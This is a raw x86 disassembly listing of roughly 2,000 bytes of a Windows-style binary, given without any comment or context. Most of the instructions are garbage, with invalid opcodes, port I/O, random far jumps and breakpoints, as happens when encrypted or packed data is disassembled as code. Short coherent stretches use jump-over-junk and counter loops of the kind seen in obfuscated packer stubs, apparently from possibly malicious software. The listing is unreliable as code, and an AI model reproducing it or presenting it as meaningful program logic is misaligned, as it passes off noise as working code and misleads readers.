  40db01:	mov    ds:0xb49c0842,eax
  40db06:	call   0xb7587a0c
  40db0b:	in     eax,0xdc
  40db0d:	push   0xffffffc3
  40db0f:	lds    esi,FWORD PTR [ebx-0x63]
  40db12:	in     eax,0x2b
  40db14:	dec    esi
  40db15:	call   0x459abf78
  40db1a:	outs   dx,DWORD PTR ds:[esi]
  40db1b:	xor    bh,BYTE PTR [esi+ebx*2+0x4e586dad]
  40db22:	popf   
  40db23:	or     eax,0x81fe97e8
  40db28:	sahf   
  40db29:	push   ds
  40db2a:	sar    DWORD PTR [ebx],0xd5
  40db2d:	sbb    al,0x88
  40db2f:	sub    eax,0x268368c
  40db34:	mov    ecx,0x7e5a391f
  40db39:	fcomp  DWORD PTR [ecx+0x61]
  40db3c:	inc    edx
  40db3d:	dec    ebx
  40db3e:	and    cl,BYTE PTR [ebx]
  40db40:	or     DWORD PTR [edi+eax*8-0x10],edx
  40db44:	loop   0x40db14
  40db46:	int3   
  40db47:	(bad)  
  40db48:	fidivr WORD PTR [edi]
  40db4a:	jo     0x40db41
  40db4c:	mov    bh,bh
  40db4e:	call   DWORD PTR ds:0xf76b34df
  40db54:	into   
  40db55:	pop    ebx
  40db56:	xor    eax,0xb406e14d
  40db5b:	lods   eax,DWORD PTR ds:[esi]
  40db5c:	mov    esp,0x4c667b84
  40db61:	pop    es
  40db62:	sub    BYTE PTR [ecx],dl
  40db64:	pop    es
  40db65:	pop    ecx
  40db66:	xor    BYTE PTR ds:0x7219af3,bh
  40db6c:	xchg   edx,eax
  40db6d:	(bad)  
  40db6e:	sub    DWORD PTR [ecx-0x16],edi
  40db71:	xchg   ecx,eax
  40db72:	aaa    
  40db73:	add    DWORD PTR [esi-0x5f],ebp
  40db76:	lds    ebp,FWORD PTR [eax+0x15]
  40db79:	mov    al,ds:0x171a78ab
  40db7e:	mov    ds:0x8ef2c7f8,al
  40db83:	add    eax,0xdc26039
  40db88:	loop   0x40dbd4
  40db8a:	rol    BYTE PTR [esi+0x7f78bb78],1
  40db90:	adc    esi,DWORD PTR [edx]
  40db92:	not    BYTE PTR fs:[edi]
  40db95:	enter  0xbb38,0xda
  40db99:	xchg   ebx,eax
  40db9a:	adc    eax,0xee54fe74
  40db9f:	sbb    DWORD PTR [edx],edx
  40dba1:	and    DWORD PTR [ecx+0x9d98264],esp
  40dba7:	jmp    0x7bca:0x1ac3439c
  40dbae:	sar    BYTE PTR [ecx+0x5d],cl
  40dbb1:	jae    0x40dba4
  40dbb3:	popa   
  40dbb4:	mov    ebx,0x850fc13b
  40dbb9:	add    BYTE PTR [edx],0x0
  40dbbc:	add    BYTE PTR [ebx-0x38cc03bb],cl
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi-0x52bfeba4],0xfa3776bd
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40db76
  40dbe0:	cdq    
  40dbe1:	cmp    eax,0x6b830450
  40dbe6:	icebp  
  40dbe7:	mov    edi,0xe468ff06
  40dbec:	stc    
  40dbed:	pop    ds
  40dbee:	mov    bl,BYTE PTR [edi]
  40dbf0:	jns    0x40db81
  40dbf2:	sbb    cl,BYTE PTR [edi]
  40dbf4:	cli    
  40dbf5:	stos   DWORD PTR es:[edi],eax
  40dbf6:	(bad)  
  40dbf7:	lods   eax,DWORD PTR ds:[esi]
  40dbf8:	ins    DWORD PTR es:[edi],dx
  40dbf9:	dec    esp
  40dbfa:	mov    cl,BYTE PTR [esi]
  40dbfc:	push   edi
  40dbfd:	cmp    ebx,ebp
  40dbff:	mov    bh,0x44
  40dc01:	jg     0x40dc09
  40dc03:	adc    bh,bh
  40dc05:	pop    ss
  40dc06:	fxam   
  40dc08:	(bad)  
  40dc09:	xor    bh,dl
  40dc0b:	cli    
  40dc0c:	popa   
  40dc0d:	xchg   BYTE PTR [edi-0x23],cl
  40dc10:	outs   dx,BYTE PTR ds:[esi]
  40dc11:	js     0x40dbfe
  40dc13:	sbb    eax,0xf39a9fc0
  40dc18:	lahf   
  40dc19:	or     eax,0x97bc4d9c
  40dc1e:	pop    edi
  40dc1f:	jle    0x40dc87
  40dc21:	test   al,0xa8
  40dc23:	pop    edx
  40dc24:	fdivr  st(6),st
  40dc26:	xchg   esp,eax
  40dc27:	ds xchg ebx,eax
  40dc29:	not    ebp
  40dc2b:	push   0x35235074
  40dc30:	in     eax,0x9c
  40dc32:	(bad)  
  40dc33:	adc    al,0x61
  40dc35:	adc    BYTE PTR [ebx+0x11],dl
  40dc38:	xchg   ebx,eax
  40dc39:	adc    BYTE PTR [ebx+0x60],dh
  40dc3c:	dec    ecx
  40dc3d:	pop    edi
  40dc3e:	sbb    eax,DWORD PTR [edx+0x0]
  40dc41:	or     cl,dl
  40dc43:	outs   dx,DWORD PTR ds:[esi]
  40dc44:	push   cs
  40dc45:	xor    eax,0xb2d00e15
  40dc4a:	mov    ebp,0xaeb392ae
  40dc4f:	or     BYTE PTR [edi-0x56],dl
  40dc52:	(bad)  
  40dc54:	push   edx
  40dc55:	sti    
  40dc56:	(bad)  
  40dc57:	ins    DWORD PTR es:[edi],dx
  40dc58:	in     al,0x73
  40dc5a:	lds    ebx,FWORD PTR [esi+0x2aa07785]
  40dc60:	jmp    0x70b3:0x2c7fc41
  40dc67:	and    BYTE PTR [ebp-0x1c02be7c],ah
  40dc6d:	xlat   BYTE PTR ds:[ebx]
  40dc6e:	add    BYTE PTR [ebx+ecx*8-0x7d],bl
  40dc72:	mov    edi,0xd140111b
  40dc77:	or     ecx,DWORD PTR [ecx-0x43486ed2]
  40dc7d:	xor    dh,ah
  40dc7f:	add    al,0x64
  40dc81:	mov    eax,ds:0x4c07c3d4
  40dc86:	outs   dx,DWORD PTR ds:[esi]
  40dc87:	sub    al,0xd4
  40dc89:	dec    ebx
  40dc8a:	mov    cl,0xa1
  40dc8c:	out    dx,eax
  40dc8d:	cld    
  40dc8e:	and    dh,BYTE PTR [edi+ecx*4+0x15ec7753]
  40dc95:	xor    bl,BYTE PTR [eax]
  40dc97:	adc    al,0x57
  40dc99:	xlat   BYTE PTR ds:[ebx]
  40dc9a:	std    
  40dc9b:	mov    bl,0x56
  40dc9d:	addr16 call edx
  40dca0:	lea    esi,[edx-0x62]
  40dca3:	dec    edi
  40dca4:	mov    dl,0xf9
  40dca6:	out    dx,al
  40dca7:	push   cs
  40dca8:	jnp    0x40dc8b
  40dcaa:	push   eax
  40dcab:	sbb    ecx,DWORD PTR [ecx]
  40dcad:	rcr    DWORD PTR [eax-0x74cc3fe4],cl
  40dcb3:	jge    0x40dcd7
  40dcb5:	push   ebx
  40dcb6:	push   cs
  40dcb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcb8:	popf   
  40dcb9:	mov    WORD PTR [ebp+edx*4-0x35],cs
  40dcbd:	ins    BYTE PTR es:[edi],dx
  40dcbe:	add    al,0xc9
  40dcc0:	jmp    0x5522:0x593edf4c
  40dcc7:	add    DWORD PTR [eax],ecx
  40dcc9:	adc    eax,0x5268f10a
  40dcce:	xchg   esp,eax
  40dccf:	je     0x40dce0
  40dcd1:	jae    0x40dcc5
  40dcd3:	push   esp
  40dcd4:	scas   eax,DWORD PTR es:[edi]
  40dcd5:	jg     0x40dc73
  40dcd7:	sub    ecx,DWORD PTR [esi]
  40dcd9:	dec    edi
  40dcda:	xchg   ecx,eax
  40dcdb:	xor    al,0xc0
  40dcdd:	rep lods eax,DWORD PTR cs:[esi]
  40dce0:	das    
  40dce1:	push   ecx
  40dce2:	cmp    BYTE PTR [edx+0x26],0x84
  40dce6:	xlat   BYTE PTR ds:[ebx]
  40dce7:	push   ebp
  40dce8:	pop    edi
  40dce9:	pop    ebp
  40dcea:	jnp    0x40dc98
  40dcec:	mov    bl,dh
  40dcee:	mov    dh,0x54
  40dcf0:	mov    eax,0xcc254d8b
  40dcf5:	popf   
  40dcf6:	in     eax,0xbc
  40dcf8:	xlat   BYTE PTR ds:[ebx]
  40dcf9:	cmp    al,0x85
  40dcfb:	jge    0x40dd1d
  40dcfd:	jae    0x40dcba
  40dcff:	pop    ecx
  40dd00:	sti    
  40dd01:	std    
  40dd02:	xchg   ebp,eax
  40dd03:	push   ss
  40dd04:	aam    0xff
  40dd06:	push   0x78
  40dd08:	clc    
  40dd09:	cmp    DWORD PTR [ebp-0x4f094844],0xc03f985f
  40dd13:	cdq    
  40dd14:	test   eax,0xc326007d
  40dd19:	xchg   ebp,eax
  40dd1a:	pop    eax
  40dd1b:	mov    esi,0x7bbc9782
  40dd20:	nop
  40dd21:	or     al,0xe3
  40dd23:	dec    esp
  40dd24:	add    eax,0x3513fb1a
  40dd29:	dec    ecx
  40dd2a:	ss js  0x40dd6e
  40dd2d:	rcl    DWORD PTR [ecx],1
  40dd2f:	xor    BYTE PTR [eax+0x1c],al
  40dd32:	lock jnp 0x40dcf2
  40dd35:	jne    0x40dcdb
  40dd37:	pop    edi
  40dd38:	pop    ebp
  40dd39:	mov    bh,0x4d
  40dd3b:	sub    al,0xc3
  40dd3d:	mov    esi,0x9859cd93
  40dd42:	push   ebx
  40dd43:	lods   al,BYTE PTR ds:[esi]
  40dd44:	sbb    eax,0xfca00a5a
  40dd49:	adc    esi,ebx
  40dd4b:	or     eax,0x4594c155
  40dd50:	cli    
  40dd51:	mov    ah,0xf2
  40dd53:	push   es
  40dd54:	stc    
  40dd55:	clc    
  40dd56:	mov    ds:0x7af425ce,al
  40dd5b:	mov    fs,WORD PTR [edi+0x30]
  40dd5e:	fsubr  QWORD PTR ds:0xa1ec34d8
  40dd64:	ror    dl,0xea
  40dd67:	fwait
  40dd68:	xchg   ebp,eax
  40dd69:	sti    
  40dd6a:	and    DWORD PTR [edi-0x640da6cb],ebx
  40dd70:	fistp  DWORD PTR [eax-0x7a]
  40dd73:	or     cl,0x3f
  40dd76:	jo     0x40dd59
  40dd78:	pop    ebx
  40dd79:	iret   
  40dd7a:	xor    esp,0x2d
  40dd7d:	out    0xc8,al
  40dd7f:	(bad)  
  40dd80:	scas   al,BYTE PTR es:[edi]
  40dd81:	test   DWORD PTR [ebx+0x34b92126],esi
  40dd87:	jg     0x40dded
  40dd89:	add    BYTE PTR [edi-0x1],cl
  40dd8c:	mov    ah,0x35
  40dd8e:	inc    eax
  40dd8f:	push   ecx
  40dd90:	and    DWORD PTR [ebx+0x1dfe4538],ecx
  40dd96:	repnz adc BYTE PTR [esi-0x1b],0x86
  40dd9b:	dec    ecx
  40dd9c:	cmp    ebp,edx
  40dd9e:	pop    esp
  40dd9f:	push   cs
  40dda0:	dec    eax
  40dda1:	(bad)  
  40dda2:	in     eax,dx
  40dda3:	sbb    al,0x97
  40dda5:	ss leave 
  40dda7:	aaa    
  40dda8:	sub    eax,0xf6eeb90a
  40ddad:	xchg   esi,eax
  40ddae:	push   es
  40ddaf:	mov    cl,0xe4
  40ddb1:	sbb    BYTE PTR [ebp-0x40],dh
  40ddb4:	cwde   
  40ddb5:	shl    BYTE PTR [edi+ebx*4],0x5e
  40ddb9:	call   0x98d747b6
  40ddbe:	outs   dx,DWORD PTR ds:[esi]
  40ddbf:	pop    esi
  40ddc0:	inc    ebp
  40ddc1:	(bad)  
  40ddc2:	push   ss
  40ddc3:	pop    esi
  40ddc4:	inc    esp
  40ddc5:	test   eax,0x9df6b270
  40ddca:	jns    0x40de2b
  40ddcc:	xchg   ecx,eax
  40ddcd:	xchg   esi,eax
  40ddce:	je     0x40ddcc
  40ddd0:	xchg   ebx,eax
  40ddd1:	imul   esp,DWORD PTR [edx],0xfffffffb
  40ddd4:	mov    dh,0x96
  40ddd6:	xor    al,0x6a
  40ddd8:	mov    ebx,0xb0780518
  40dddd:	push   esi
  40ddde:	mov    dh,0x65
  40dde0:	inc    ebx
  40dde1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dde2:	inc    esi
  40dde3:	dec    ebp
  40dde4:	shl    dl,1
  40dde6:	shr    BYTE PTR [ebx-0x3595b1d6],cl
  40ddec:	std    
  40dded:	cmp    al,0x91
  40ddef:	and    al,BYTE PTR [eax-0x48da27af]
  40ddf5:	div    ecx
  40ddf7:	add    BYTE PTR [eax+eiz*2-0x95dafd1],ch
  40ddfe:	scas   al,BYTE PTR es:[edi]
  40ddff:	es std 
  40de01:	in     eax,dx
  40de02:	or     edi,DWORD PTR [esi-0x7c75a9ff]
  40de08:	jmp    0xa263416
  40de0d:	rcl    DWORD PTR [ecx],0x1d
  40de10:	or     eax,0xe5225076
  40de15:	out    dx,al
  40de16:	xor    cl,cl
  40de18:	inc    edi
  40de19:	popa   
  40de1a:	push   esp
  40de1b:	push   es
  40de1c:	mov    eax,esi
  40de1e:	int3   
  40de1f:	add    eax,esi
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43379f,0x0
  40de5a:	mov    eax,ds:0x43379f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43379f,eax
  40de65:	cmp    DWORD PTR ds:0x43379f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43379f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x4337ef,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	test   DWORD PTR [ebx-0x45936815],0x127e7e9c
  40deaf:	jg     0x40df2f
  40deb1:	jle    0x40de8e
  40deb3:	(bad)  
  40deb4:	cmp    al,0x63
  40deb6:	fst    QWORD PTR [esi]
  40deb8:	jmp    0x40df1d
  40deba:	or     cl,0x92
  40debd:	add    al,0x2c
  40debf:	ds xor bl,al
  40dec2:	and    BYTE PTR [edx+0xe3aa4e1],bh
  40dec8:	or     ecx,DWORD PTR [ecx+0x20f7ac9a]
  40dece:	jg     0x40de9b
  40ded0:	imul   DWORD PTR [eax-0x7be68221]
  40ded6:	jmp    0x40deb9
  40ded8:	rol    BYTE PTR [ebx-0xcfb96c],0x38
  40dedf:	jne    0x40deb1
  40dee1:	enter  0x5691,0xe1
  40dee5:	in     eax,dx
  40dee6:	cmp    al,0xe2
  40dee8:	int3   
  40dee9:	add    BYTE PTR [edx+0x6d5b08da],al
  40deef:	outs   dx,BYTE PTR ds:[esi]
  40def0:	jge    0x40df4b
  40def2:	and    DWORD PTR [eax],edx
  40def4:	sub    DWORD PTR [ebp-0x711d6c81],edx
  40defa:	cmp    dl,dh
  40defc:	or     al,cl
  40defe:	fs mov dl,0x5c
  40df01:	xchg   BYTE PTR [ecx-0x7c],bh
  40df04:	fsubp  st(6),st
  40df06:	push   ebx
  40df07:	shl    DWORD PTR [ecx],0xb0
  40df0a:	push   edx
  40df0b:	mov    bl,0x83
  40df0d:	scas   al,BYTE PTR es:[edi]
  40df0e:	iret   
  40df0f:	inc    eax
  40df10:	and    ebx,edx
  40df12:	dec    ebp
  40df13:	adc    eax,0x409200c3
  40df18:	neg    DWORD PTR [eax+0x2c]
  40df1b:	int3   
  40df1c:	push   ebx
  40df1d:	mov    ebp,0x4ceb6137
  40df22:	mov    edx,0x5e3b5f7c
  40df27:	mov    bh,0x94
  40df29:	test   BYTE PTR [edx-0x256f5584],bh
  40df2f:	or     cl,BYTE PTR [edi+0x76]
  40df32:	sti    
  40df33:	jge    0x40def1
  40df35:	pop    esp
  40df36:	and    BYTE PTR [eax+edx*8-0x5f],0xf4
  40df3b:	sub    DWORD PTR [edi+0x51],0xffffffab
  40df3f:	loope  0x40df43
  40df41:	cmp    BYTE PTR [ebp-0x2d],0x14
  40df45:	mov    ds:0x98e174da,al
  40df4a:	test   eax,edi
  40df4c:	adc    bh,BYTE PTR [esi-0x8654e41]
  40df52:	pushf  
  40df53:	repnz leave 
  40df55:	and    eax,DWORD PTR [ebx]
  40df57:	and    eax,ebx
  40df59:	sub    dl,dh
  40df5b:	cmc    
  40df5c:	fidiv  DWORD PTR [ecx]
  40df5e:	imul   ebx,DWORD PTR [edi],0x67
  40df61:	mov    al,0x29
  40df63:	aas    
  40df64:	test   al,0x75
  40df66:	and    cl,BYTE PTR ds:0xcecb4d16
  40df6c:	pop    ebx
  40df6d:	pop    edi
  40df6e:	xchg   BYTE PTR [esp+ebp*2],bh
  40df71:	jecxz  0x40dfcb
  40df73:	push   eax
  40df74:	fstp   TBYTE PTR [eax-0x50]
  40df77:	or     BYTE PTR [esi],0xb2
  40df7a:	cli    
  40df7b:	mov    dh,0x7d
  40df7d:	not    BYTE PTR [eax+0x33]
  40df80:	push   esp
  40df81:	sbb    eax,0x78833227
  40df86:	xchg   edx,eax
  40df87:	scas   eax,DWORD PTR es:[edi]
  40df88:	js     0x40dfc5
  40df8a:	fild   WORD PTR [ebx-0x6d380af3]
  40df90:	inc    ebx
  40df91:	cmp    ch,ah
  40df93:	push   edi
  40df94:	out    dx,al
  40df95:	out    dx,al
  40df96:	push   ebx
  40df97:	nop
  40df98:	ds jmp 0x40dfd3
  40df9b:	cld    
  40df9c:	arpl   WORD PTR [eax-0x7ee3ccd8],si
  40dfa2:	in     eax,dx
  40dfa3:	in     al,dx
  40dfa4:	in     al,0x97
  40dfa6:	aaa    
  40dfa7:	xchg   ebx,eax
  40dfa8:	enter  0xb2a2,0x88
  40dfac:	repz adc eax,0x60bdd377
  40dfb2:	pop    esi
  40dfb3:	(bad)  
  40dfb4:	xor    DWORD PTR [ecx+0x25],esi
  40dfb7:	enter  0xce78,0xcc
  40dfbb:	xchg   esp,eax
  40dfbc:	add    al,0x32
  40dfbe:	test   al,0xca
  40dfc0:	mov    ch,0xaa
  40dfc2:	sbb    eax,0xf8f40cc2
  40dfc7:	loope  0x40df68
  40dfc9:	cli    
  40dfca:	mov    ds:0x8b114c67,eax
  40dfcf:	inc    ebp
  40dfd0:	or     BYTE PTR [ecx+0x4337972d],al
  40dfd6:	add    BYTE PTR ds:0x53000006,ah
  40dfdc:	sub    DWORD PTR ds:0x4337eb,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	mov    ds:0x5e3f0654,eax
  40e008:	popf   
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e022
  40e010:	xchg   esp,eax
  40e011:	imul   edi,edi,0xf106be58
  40e017:	and    eax,0x7af27990
  40e01c:	test   al,0x5a
  40e01e:	aas    
  40e01f:	(bad)  
  40e020:	jae    0x40e084
  40e022:	(bad)  [esi+0x30ef008b]
  40e028:	ins    BYTE PTR es:[edi],dx
  40e029:	call   0xb27479b1
  40e02e:	sbb    ch,BYTE PTR [edi+0x53007706]
  40e034:	stos   DWORD PTR es:[edi],eax
  40e035:	popf   
  40e036:	sub    DWORD PTR [ecx-0x17],ebx
  40e039:	fwait
  40e03a:	adc    al,0x70
  40e03c:	and    bh,bh
  40e03e:	inc    ecx
  40e03f:	xchg   esi,eax
  40e040:	push   ecx
  40e041:	loop   0x40e0ab
  40e043:	inc    esi
  40e044:	sub    cl,bl
  40e046:	jl     0x40e0a7
  40e048:	push   edi
  40e049:	js     0x40e084
  40e04b:	jge    0x40e09a
  40e04d:	sub    dl,BYTE PTR [edi-0x1120da13]
  40e053:	enter  0xd92d,0xa8
  40e057:	mov    bh,0xb5
  40e059:	loopne 0x40e088
  40e05b:	int    0x86
  40e05d:	(bad)
  40e061:	test   al,0xf5
  40e064:	cli    
  40e065:	sub    DWORD PTR [ebx-0x2fd2a3c1],ebx
  40e06b:	sbb    al,BYTE PTR [ecx]
  40e06d:	push   esi
  40e06e:	aas    
  40e06f:	push   edx
  40e070:	aam    0xab
  40e072:	jmp    0xa80c1cff
  40e077:	fcmovnbe st,st(6)
  40e079:	sti    
  40e07a:	mov    BYTE PTR [ebp+0x30],cl
  40e07d:	loope  0x40e0d7
  40e07f:	aas    
  40e080:	outs   dx,BYTE PTR ds:[esi]
  40e081:	sub    al,0x3c
  40e083:	outs   dx,BYTE PTR ds:[esi]
  40e084:	addr16 jle 0x40e0f0
  40e087:	push   ebp
  40e088:	ffreep st(6)
  40e08a:	loope  0x40e050
  40e08c:	(bad)  
  40e08d:	addr16 pop eax
  40e08f:	xlat   BYTE PTR ds:[ebx]
  40e090:	xchg   edi,eax
  40e091:	stos   DWORD PTR es:[edi],eax
  40e092:	ret    0x54db
  40e095:	idiv   DWORD PTR [ebp+0x5923b45]
  40e09b:	sbb    dh,BYTE PTR [ebx+esi*8+0x2d8bbea2]
  40e0a2:	sbb    eax,0x836c2216
  40e0a7:	adc    BYTE PTR [edi-0x2bdc074d],bh
  40e0ad:	sbb    eax,0x7235d690
  40e0b2:	adc    esp,DWORD PTR [ecx]
  40e0b4:	jmp    0x40e04d
  40e0b6:	add    al,0xe0
  40e0b8:	out    dx,al
  40e0b9:	xchg   esp,eax
  40e0ba:	outs   dx,BYTE PTR ss:[esi]
  40e0bc:	xor    eax,0x492fd639
  40e0c1:	mov    ebp,0x9457ceed
  40e0c6:	mov    edx,0xeef3b961
  40e0cb:	arpl   WORD PTR [eax+0xa],cx
  40e0ce:	inc    edi
  40e0cf:	cmp    al,BYTE PTR [esp+ecx*2-0x68340b3a]
  40e0d6:	jmp    0xd390:0xbef187cb
  40e0dd:	sub    DWORD PTR [edi-0x63db8db8],ecx
  40e0e3:	mov    edx,0xedfedb0e
  40e0e8:	inc    edx
  40e0e9:	xor    BYTE PTR ds:0x7116c26f,dh
  40e0ef:	mov    ecx,0xf84a985c
  40e0f4:	and    al,0xbf
  40e0f6:	outs   dx,DWORD PTR ds:[esi]
  40e0f7:	sahf   
  40e0f8:	xchg   ebp,eax
  40e0f9:	mov    ah,0xc7
  40e0fb:	cmc    
  40e0fc:	iret   
  40e0fd:	aam    0xdf
  40e0ff:	pop    esi
  40e100:	and    edx,ecx
  40e102:	arpl   di,si
  40e104:	or     eax,0xffebed31
  40e109:	int    0xb3
  40e10b:	sbb    al,ch
  40e10d:	nop
  40e10e:	(bad)  
  40e10f:	mov    fs,WORD PTR [edi+0x4b]
  40e112:	xor    eax,0xb8b488be
  40e117:	pusha  
  40e118:	jl     0x40e0e0
  40e11a:	jg     0x40e161
  40e11c:	ret    
  40e11d:	sbb    al,0xe3
  40e11f:	sub    cl,bh
  40e121:	inc    ecx
  40e122:	cmp    bl,BYTE PTR [esi+0x1b5be4e3]
  40e128:	aaa    
  40e129:	push   ecx
  40e12a:	cli    
  40e12b:	xor    eax,esi
  40e12d:	adc    DWORD PTR ds:0x4337a3,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x4337ef,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	sbb    BYTE PTR [ebp-0x6e],ch
  40e15d:	xchg   edi,eax
  40e15e:	jb     0x40e0fa
  40e160:	jle    0x40e1e0
  40e162:	adc    bh,BYTE PTR [edi+0x7e]
  40e165:	jle    0x40e17c
  40e167:	dec    eax
  40e168:	clc    
  40e169:	xchg   esp,eax
  40e16a:	xchg   ecx,eax
  40e16b:	lea    ebp,[ecx+0x45]
  40e16e:	jmp    0xdbd1:0xfc539b76
  40e175:	out    dx,al
  40e176:	dec    ebp
  40e177:	pop    edi
  40e178:	repz rol BYTE PTR [eax+edi*2],1
  40e17c:	cmp    eax,0xc674b610
  40e181:	jmp    0x40e169
  40e183:	pop    es
  40e184:	lock mov ah,0x7b
  40e187:	mov    ebp,0x31c7afd6
  40e18c:	xchg   esp,eax
  40e18d:	hlt    
  40e18e:	fld    TBYTE PTR ds:0xf70c4c84
  40e194:	and    al,BYTE PTR [ebx+ebx*1]
  40e197:	jne    0x40e1c6
  40e199:	xchg   esi,eax
  40e19a:	mov    bh,0x50
  40e19c:	ins    DWORD PTR es:[edi],dx
  40e19d:	mov    ds:0x814252f3,al
  40e1a2:	cmp    al,0x45
  40e1a4:	or     DWORD PTR [ebx+0x1b311b76],0x227acf08
  40e1ae:	mov    ch,0x7f
  40e1b0:	pop    esp
  40e1b1:	inc    esp
  40e1b2:	xchg   BYTE PTR [eax-0x1a],dl
  40e1b5:	mov    DWORD PTR [esi+0x6c6d33f0],esi
  40e1bb:	or     ebp,esi
  40e1bd:	push   cs
  40e1be:	lds    edi,FWORD PTR [ecx+ebp*4-0x138b9e12]
  40e1c5:	inc    esi
  40e1c6:	dec    ebp
  40e1c7:	gs in  al,dx
  40e1c9:	sub    BYTE PTR [edi+ebp*4+0x33],al
  40e1cd:	adc    al,0xdf
  40e1cf:	push   0x5b
  40e1d1:	into   
  40e1d2:	sti    
  40e1d3:	sbb    ebp,DWORD PTR [eax+ebp*4]
  40e1d6:	mov    ch,al
  40e1d8:	dec    ecx
  40e1d9:	xor    ecx,DWORD PTR [ebx+0x72]
  40e1dc:	sub    DWORD PTR [ecx+0x31d1b5f1],edx
  40e1e2:	repz shl cl,0x41
  40e1e6:	stos   DWORD PTR es:[edi],eax
  40e1e7:	fld    TBYTE PTR [ecx+0x26]
  40e1ea:	in     eax,dx
  40e1eb:	call   0x6bbcdf38
  40e1f0:	shl    BYTE PTR [bx+si],cl
  40e1f3:	gs mov ah,0x41
  40e1f6:	icebp  
  40e1f7:	xchg   esi,eax
  40e1f8:	repz push es
  40e1fa:	mov    ah,0x63
  40e1fc:	jmp    0x9c0f:0xa4cca834
  40e203:	mov    WORD PTR [edi+0x11],?
  40e206:	arpl   WORD PTR [ebx+edi*2],bx
  40e209:	mov    al,0xd5
  40e20b:	mov    bh,0xae
  40e20d:	sub    BYTE PTR ds:0xe449ba50,ch
  40e213:	pop    ecx
  40e214:	fwait
  40e215:	out    0x4d,eax
  40e217:	push   ecx
  40e218:	xor    eax,0xc7196049
  40e21d:	aad    0xd2
  40e21f:	mov    ch,dl
  40e221:	mov    bh,0xf5
  40e223:	push   ecx
  40e224:	pop    eax
  40e225:	std    
  40e226:	hlt    
  40e227:	xor    BYTE PTR [ecx+0x4df3cfd8],0x6b
  40e22e:	popa   
  40e22f:	mov    al,ds:0x7960a142
  40e234:	adc    edi,ebx
  40e236:	loope  0x40e22c
  40e238:	ins    BYTE PTR es:[edi],dx
  40e239:	and    ecx,ecx
  40e23b:	lods   al,BYTE PTR ds:[esi]
  40e23c:	addr16 dec esi
  40e23e:	mov    esi,ebp
  40e240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e241:	push   eax
  40e242:	and    eax,0xf3331f74
  40e247:	jmp    0x1d00:0x4b2307e9
  40e24e:	popf   
  40e24f:	mov    edi,0xb1a637c6
  40e254:	jp     0x40e1eb
  40e256:	outs   dx,BYTE PTR ds:[esi]
  40e257:	es push ebx
  40e259:	in     al,0xae
  40e25b:	or     eax,0xc3b5951e
  40e260:	cmp    ebx,ecx
  40e262:	lock into 
  40e264:	push   esp
  40e265:	xchg   edi,eax
  40e266:	push   ecx
  40e267:	(bad)  
  40e268:	jns    0x40e237
  40e26a:	lods   eax,DWORD PTR ds:[esi]
  40e26b:	or     al,0xe4
  40e26d:	(bad)  
  40e26e:	sbb    ebp,ebx
  40e270:	imul   ebx,DWORD PTR [ecx+0xb],0xffffff92
  40e274:	or     cl,bh
  40e276:	jnp    0x40e2b6
  40e278:	mov    esi,0x1da4e63a
  40e27d:	push   ecx
  40e27e:	push   edx
  40e27f:	loope  0x40e23d
  40e281:	icebp  
  40e282:	mov    DWORD PTR [ebp-0x18],eax
  40e285:	mov    edi,DWORD PTR [ebp+0x8]
  40e288:	inc    DWORD PTR ds:0x43370b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x4337e3,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x43382b
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433797,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43370b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x4337d7,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43379f,0x877
